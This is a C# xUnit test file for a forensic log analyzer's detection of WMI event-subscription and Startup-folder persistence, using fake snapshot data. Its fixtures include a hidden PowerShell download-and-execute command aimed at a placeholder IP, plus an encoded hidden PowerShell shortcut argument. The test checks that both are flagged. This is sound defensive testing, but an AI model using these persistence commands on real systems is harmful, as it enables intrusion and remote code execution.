using System.IO;
using System.Text.Json;
using LogAnalyzer.Dfir.Model;
using LogAnalyzer.Dfir.Presentation;
using LogAnalyzer.Dfir.Windows.Acquisition;
using LogAnalyzer.Dfir.Windows.Investigation;
using Xunit;

namespace LogAnalyzer.App.Tests;

/// <summary>Planner #11 A8: permanent WMI subscriptions and Startup folders in the live snapshot. Fake snapshot data only; nothing touches the real WMI or the real Startup folders.</summary>
public sealed class LiveWmiStartupTests : IDisposable
{
    private readonly string _dir = Path.Combine(Path.GetTempPath(), "la-a8-" + Guid.NewGuid().ToString("N"));
    public LiveWmiStartupTests() => Directory.CreateDirectory(_dir);
    public void Dispose() { try { Directory.Delete(_dir, true); } catch (IOException) { } }

    private List<Finding> Analyze(List<WmiSubscriptionRow>? wmi, List<StartupRow>? startup)
    {
        var snap = new LiveStateCollector.Snapshot(new DateTimeOffset(2026, 11, 20, 8, 0, 0, TimeSpan.Zero), "PC-TEST", [], [], [], [], [], [], wmi, startup);
        var path = Path.Combine(_dir, "live.json");
        File.WriteAllText(path, JsonSerializer.Serialize(snap));
        var item = new EvidenceItem { EvidenceId = "E-0007", CaseId = "C", Source = "live system", SourceType = "live_snapshot" };
        return LiveStateAnalyzer.Analyze(item, path, 0).ToList();
    }

    private static StartupRow Row(string name, string target = "", string args = "", string signature = "", bool writable = true, string dir = @"C:\Users\ana\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup") =>
        new("utilizatorul ana", dir + "\\" + name, name, 1234, new string('A', 64), "2026-11-01T10:00:00.0000000Z", "2026-11-02T10:00:00.0000000Z", "2026-11-03T10:00:00.0000000Z", target, args, signature, writable);

    [Fact]
    public void Command_consumer_binding_is_a_high_finding_quoting_the_command_with_locator_and_steps()
    {
        var fs = Analyze([new("FiltruTest", "SELECT * FROM __InstanceModificationEvent WITHIN 60", @"root\cimv2", "ConsumatorTest", "CommandLineEventConsumer", @"powershell.exe -nop -w hidden -c ""iex (iwr http://203.0.113.5/a)""")], null);
        var f = Assert.Single(fs);
        Assert.Equal("LIVE-WMI-SUBSCRIPTION", f.RuleId);
        Assert.Equal(Severity.High, f.Severity);
        var e = Assert.Single(f.SupportingEvidence);
        Assert.Equal("WmiSubscriptions[FiltruTest->ConsumatorTest]", e.Locator);
        Assert.Contains("Command=powershell.exe -nop -w hidden", e.Quote);
        var steps = string.Join("\n", ManualVerification.For(e, null).Select(s => s.ToLine()));
        Assert.Contains(@"Get-CimInstance -Namespace root\subscription -ClassName __FilterToConsumerBinding", steps);
        Assert.Contains(@"-ClassName __EventFilter -Filter ""Name='FiltruTest'""", steps);
        Assert.Contains(@"-ClassName CommandLineEventConsumer -Filter ""Name='ConsumatorTest'""", steps);
    }

    [Fact]
    public void Builtin_event_log_consumer_and_empty_snapshots_give_no_finding()
    {
        Assert.Empty(Analyze([new("SCM Event Log Filter", "SELECT * FROM MSFT_SCMEventLogEvent", @"root\cimv2", "SCM Event Log Consumer", "NTEventLogEventConsumer", "")], null));
        Assert.Empty(Analyze([], []));
        Assert.Empty(Analyze(null, null));   // a snapshot written before this change has no such lists
    }

    [Fact]
    public void Startup_script_and_lnk_to_powershell_with_arguments_are_findings_with_locator_and_steps()
    {
        var fs = Analyze(null, [
            Row("porneste.vbs"),
            Row("Actualizare.lnk", @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", "-w hidden -enc AAAA", "semnat (Authenticode) Microsoft", writable: false),
            Row("Tool.lnk", @"C:\Users\ana\AppData\Local\Temp\x.exe", "", "NESEMNAT")]);
        Assert.Equal(3, fs.Count);
        var lnk = fs.Single(f => f.Title.Contains("Actualizare.lnk"));
        Assert.Equal(Severity.High, lnk.Severity);
        Assert.Equal("LIVE-STARTUP-LNK", lnk.RuleId);
        var ev = lnk.SupportingEvidence[0];
        Assert.Equal(@"Startup[C:\Users\ana\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Actualizare.lnk]", ev.Locator);
        Assert.Contains("Target=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", ev.Quote);
        Assert.Contains("Arguments=-w hidden -enc AAAA", ev.Quote);
        var vbs = fs.Single(f => f.Title.Contains("porneste.vbs"));
        Assert.Equal(Severity.Medium, vbs.Severity);
        Assert.Equal(Severity.Medium, fs.Single(f => f.Title.Contains("Tool.lnk")).Severity);
        var steps = string.Join("\n", ManualVerification.For(ev, null).Select(s => s.ToLine()));
        Assert.Contains(@"Get-ChildItem -Force 'C:\Users\ana\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'", steps);
        Assert.Contains("Get-FileHash -LiteralPath 'C:\\Users\\ana\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Actualizare.lnk' -Algorithm SHA256", steps);
        Assert.Contains("CreateShortcut(", steps);
    }

    [Fact]
    public void Benign_startup_entries_give_no_finding()
    {
        Assert.Empty(Analyze(null, [
            Row("SecurityHealth.exe", signature: "semnat (Authenticode) Microsoft", writable: false, dir: @"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"),
            Row("Notepad.lnk", @"C:\Windows\System32\notepad.exe", "", "semnat (Authenticode) Microsoft", writable: false),
            Row("readme.txt")]));
    }

    [Fact]
    public void Wmi_reference_is_parsed_into_class_and_unescaped_name()
    {
        Assert.Equal(("CommandLineEventConsumer", @"a\b""c"), LiveStatePersistence.ParseWmiRef(@"\\PC\ROOT\subscription:CommandLineEventConsumer.Name=""a\\b\""c"""));
        Assert.Equal(("", ""), LiveStatePersistence.ParseWmiRef(null));
    }
}
